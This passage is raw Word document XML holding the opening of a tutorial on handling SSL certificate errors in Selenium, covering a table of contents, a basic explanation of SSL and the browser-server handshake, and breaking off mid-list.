          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>SSL Certificate Error Handling in Selenium</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="492" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL (Secure Socket Layer) Certificate ensures secure transformation of data across the server and client application using strong encryption standard or digital signature. One has to install an SSL certificate or a code signing certificate. </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="493" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="494" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In this tutorial, you will learn-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="495" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="496"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"1" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>What is SSL Certificate</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497" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="498"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"2" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>How Does the SSL Certificate Create a Secure Connection</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499" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="500"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"3" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of SSL Certificates</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01" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="502"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"4" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>How SSL certificates are verified</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03" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="504"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"5" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of SSL Certificate Error</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05" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="506"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"6" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">How to handle SSL Certificate Error using Selenium </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Webdriver</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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07" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="508"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"7" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in Firefox</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09" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="510"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"8" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in Chrome</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="105"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="511" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="512" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/ssl-certificate-error-handling-selenium.html" \l "9" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL Certificate Error Handling in IE</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="513" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="514" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>What is SSL Certificate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="515" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="516" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>SSL (Secure Sockets Layer) is a standard security protocol for establishing a secure connection between the server and the client which is a browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="517" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="518" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>There are number of benefits of using SSL certificate like,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="519" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="520" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>One can increase their users' and customer's trust in order to enhance the business' growth rapidly</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="521" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="522" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>These certificates help to secure online transactions and customers sensitive information like credit-card/debit-card data, etc.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="523" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="524" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Signing certificate tends to get a maximum number of downloads and good reviews from users.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="525" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="526" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>SSL-secured websites begin with </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>https:// </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>and you can see a lock icon or green address bar if the connection is securely established.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="527" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="528" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>For example, if you want to do some transaction via net banking or want to purchase a</w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/mobile-testing.html" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Mobile </w:t>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">phone through e-commerce site such as </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Flipkart</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> or Amazon.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="529" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="530" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">What happens between the Web Browser and </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Server</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="531" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="532" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>A browser tries to connect with a website secured with SSL. The browser requests the webserver to identify itself</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="533" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="534" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The server sends the browser a copy of its SSL certificate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="535" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="536" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The browser verifies whether the SSL certificate is genuine. If so, it sends a message to the server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="537" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="538" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The server sends back a digitally signed acknowledgment to start an SSL encrypted session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="539" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="540" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The encrypted data is shared between the server and the browser</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="541" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="542" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In doing so, you need to transmit sensitive information such as credit card numbers or login credentials and that has to transmit securely so that it cannot be hacked or intercept.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00B03134">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="543" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="544" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>For example</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B03134" w:rsidRPr="00B03134" w:rsidRDefault="00B03134" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="545" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="546" w:author="Unknown">
        <w:r w:rsidRPr="00B03134">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
